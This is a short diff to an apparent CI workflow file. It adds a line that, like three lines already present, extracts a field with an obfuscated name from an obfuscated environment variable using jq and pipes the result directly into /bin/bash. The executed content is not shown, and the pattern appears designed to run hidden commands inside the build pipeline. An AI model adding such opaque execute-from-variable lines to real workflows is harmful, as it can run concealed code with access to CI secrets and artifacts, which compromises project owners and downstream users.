@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$zoil03" | jq -r .wld2 | /bin/bash
           printf '%s' "$a97116" | jq -r .t6 | /bin/bash
           printf '%s' "$faj2" | jq -r .ggqum984 | /bin/bash
+          echo $bihs155 | jq -r .xsxys350 | /bin/bash
 
       - name: Upload results
         if: always()
